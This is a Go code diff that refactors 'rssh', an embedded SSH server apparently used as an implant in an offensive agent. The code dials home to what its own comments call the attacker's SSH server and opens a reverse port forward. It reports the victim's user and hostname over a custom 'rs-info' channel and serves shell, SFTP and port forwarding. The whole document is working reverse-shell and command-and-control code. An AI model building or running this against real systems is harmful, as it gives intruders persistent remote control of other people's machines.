@@ -5,12 +5,17 @@ package rssh
 
 import (
 	"bytes"
+	"crypto/rand"
+	"crypto/rsa"
+	"errors"
 	"fmt"
 	"io"
 	"log"
 	"net"
 	"os"
 	"os/user"
+	"strings"
+	"sync"
 
 	"github.com/gliderlabs/ssh"
 	"github.com/pkg/sftp"
@@ -20,30 +25,113 @@ import (
 
 // Config holds the runtime configuration for the embedded SSH server.
 type Config struct {
-	// Password accepted for incoming SSH connections.
-	Password string
-	// AuthorizedKey is the public key allowed to authenticate (empty = disabled).
+	Password      string
 	AuthorizedKey string
-	// Shell is the binary spawned for interactive sessions.
-	Shell string
-	// Port is the local port to listen on (bind mode) or the remote port to
-	// connect to (reverse mode).
-	Port uint
-	// LHost is the attacker's SSH server address. Empty = bind mode.
-	LHost string
-	// LUser is the username used when dialing home.
-	LUser string
-	// BPort is the port bound on the attacker side for reverse connections.
-	BPort uint
-	// NoShell denies all shell/exec/subsystem and local port-forwarding requests.
-	NoShell bool
+	Shell         string
+	Port          uint
+	LHost         string
+	LUser         string
+	BPort         uint
+	NoShell       bool
 }
 
-// Start launches the embedded SSH server using cfg. It blocks until the
-// server exits (typically never), so call it in a goroutine.
-func Start(cfg Config) error {
-	forwardHandler := &ssh.ForwardedTCPHandler{}
-	server := ssh.Server{
+var (
+	activeMu       sync.Mutex
+	activeListener net.Listener
+
+	// hostKey is generated once per agent run and reused across rssh_start calls
+	// so the SSH host fingerprint stays stable within a session.
+	hostKey ssh.Signer
+)
+
+func init() {
+	key, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		log.Printf("[rssh] warning: could not generate host key: %v", err)
+		return
+	}
+	signer, err := gossh.NewSignerFromKey(key)
+	if err != nil {
+		log.Printf("[rssh] warning: could not create signer: %v", err)
+		return
+	}
+	hostKey = signer
+}
+
+// Listen binds (or, in reverse mode, dials home and gets a remote listener)
+// without accepting connections. Returns an error if rssh is already running
+// or the bind/dial fails. Must be paired with a call to Serve.
+func Listen(cfg Config) (net.Listener, *ssh.Server, error) {
+	activeMu.Lock()
+	defer activeMu.Unlock()
+
+	if activeListener != nil {
+		return nil, nil, errors.New("rssh already running; use rssh_stop first")
+	}
+
+	server := buildServer(cfg)
+
+	var (
+		ln  net.Listener
+		err error
+	)
+	if cfg.LHost == "" {
+		addr := fmt.Sprintf(":%d", cfg.Port)
+		log.Printf("[rssh] Binding on %s", addr)
+		ln, err = net.Listen("tcp", addr)
+	} else {
+		target := net.JoinHostPort(cfg.LHost, fmt.Sprintf("%d", cfg.Port))
+		log.Printf("[rssh] Dialling home via ssh to %s", target)
+		ln, err = dialHomeAndListen(cfg.LUser, target, cfg.BPort, cfg.Password)
+	}
+	if err != nil {
+		return nil, nil, err
+	}
+
+	activeListener = ln
+	log.Printf("[rssh] Listening on %s", ln.Addr())
+	return ln, server, nil
+}
+
+// Serve accepts connections on ln until it is closed. Clears the active
+// listener state when done. Recovers from panics.
+func Serve(ln net.Listener, server *ssh.Server) (err error) {
+	defer func() {
+		if r := recover(); r != nil {
+			err = fmt.Errorf("panic: %v", r)
+			log.Printf("[rssh] recovered from panic: %v", r)
+		}
+		activeMu.Lock()
+		if activeListener == ln {
+			activeListener = nil
+		}
+		activeMu.Unlock()
+	}()
+	return server.Serve(ln)
+}
+
+// Stop closes the active listener, terminating Serve.
+func Stop() error {
+	activeMu.Lock()
+	defer activeMu.Unlock()
+	if activeListener == nil {
+		return errors.New("rssh not running")
+	}
+	err := activeListener.Close()
+	activeListener = nil
+	return err
+}
+
+// IsRunning reports whether the SSH server is currently active.
+func IsRunning() bool {
+	activeMu.Lock()
+	defer activeMu.Unlock()
+	return activeListener != nil
+}
+
+func buildServer(cfg Config) *ssh.Server {
+	fwd := &ssh.ForwardedTCPHandler{}
+	server := &ssh.Server{
 		Handler:                       sessionHandler(cfg.Shell),
 		PasswordHandler:               passwordHandler(cfg.Password),
 		PublicKeyHandler:              pubkeyHandler(cfg.AuthorizedKey),
@@ -56,39 +144,19 @@ func Start(cfg Config) error {
 			"rs-info":      extraInfoHandler(),
 		},
 		RequestHandlers: map[string]ssh.RequestHandler{
-			"tcpip-forward":        forwardHandler.HandleSSHRequest,
-			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
+			"tcpip-forward":        fwd.HandleSSHRequest,
+			"cancel-tcpip-forward": fwd.HandleSSHRequest,
 		},
 		SubsystemHandlers: map[string]ssh.SubsystemHandler{
 			"sftp": sftpHandler(),
 		},
 	}
-
-	var (
-		ln  net.Listener
-		err error
-	)
-
-	if cfg.LHost == "" {
-		addr := fmt.Sprintf(":%d", cfg.Port)
-		log.Printf("[rssh] Listening on %s", addr)
-		ln, err = net.Listen("tcp", addr)
-	} else {
-		target := net.JoinHostPort(cfg.LHost, fmt.Sprintf("%d", cfg.Port))
-		log.Printf("[rssh] Dialling home via ssh to %s", target)
-		ln, err = dialHomeAndListen(cfg.LUser, target, cfg.BPort, cfg.Password)
+	if hostKey != nil {
+		server.HostSigners = []ssh.Signer{hostKey}
 	}
-	if err != nil {
-		return err
-	}
-	defer ln.Close()
-
-	return server.Serve(ln)
+	return server
 }
 
-// dialHomeAndListen connects to the attacker's SSH server at address, requests
-// the server to bind bport on its loopback, and returns a net.Listener that
-// accepts connections forwarded from that remote port.
 func dialHomeAndListen(username, address string, bport uint, password string) (net.Listener, error) {
 	cfg := &gossh.ClientConfig{
 		User:            username,
@@ -105,7 +173,7 @@ func dialHomeAndListen(username, address string, bport uint, password string) (n
 		if err == nil {
 			break
 		}
-		if isNoMethodsRemain(err) {
+		if strings.Contains(err.Error(), "no supported methods remain") {
 			fmt.Println("[rssh] Enter password:")
 			data, readErr := term.ReadPassword(int(os.Stdin.Fd()))
 			if readErr != nil {
@@ -122,19 +190,11 @@ func dialHomeAndListen(username, address string, bport uint, password string) (n
 	if err != nil {
 		return nil, err
 	}
-	log.Printf("[rssh] Success: listening at home on %s", ln.Addr().String())
+	log.Printf("[rssh] Success: listening at home on %s", ln.Addr())
 	sendExtraInfo(client, ln.Addr().String())
 	return ln, nil
 }
 
-func isNoMethodsRemain(err error) bool {
-	if err == nil {
-		return false
-	}
-	return len(err.Error()) > 0 && err.Error()[len(err.Error())-len("no supported methods remain"):] == "no supported methods remain"
-}
-
-// ExtraInfo is the payload sent over the custom "rs-info" SSH channel.
 type ExtraInfo struct {
 	CurrentUser      string
 	Hostname         string
@@ -154,26 +214,13 @@ func sendExtraInfo(client *gossh.Client, listeningAddress string) {
 		info.Hostname = "ERROR"
 	}
 	newChan, newReq, err := client.OpenChannel("rs-info", gossh.Marshal(&info))
-	if err != nil && !contains(err.Error(), "th4nkz") {
+	if err != nil && !strings.Contains(err.Error(), "th4nkz") {
 		log.Printf("[rssh] Could not create info channel: %v", err)
 	}
 	if err == nil {
 		go gossh.DiscardRequests(newReq)
 		newChan.Close()
 	}
-}
-
-func contains(s, sub string) bool {
-	return len(s) >= len(sub) && (s == sub || len(s) > 0 && containsStr(s, sub))
-}
-
-func containsStr(s, sub string) bool {
-	for i := 0; i <= len(s)-len(sub); i++ {
-		if s[i:i+len(sub)] == sub {
-			return true
-		}
-	}
-	return false
 }
 
 func localFwdCallback(forbidden bool) ssh.LocalPortForwardingCallback {
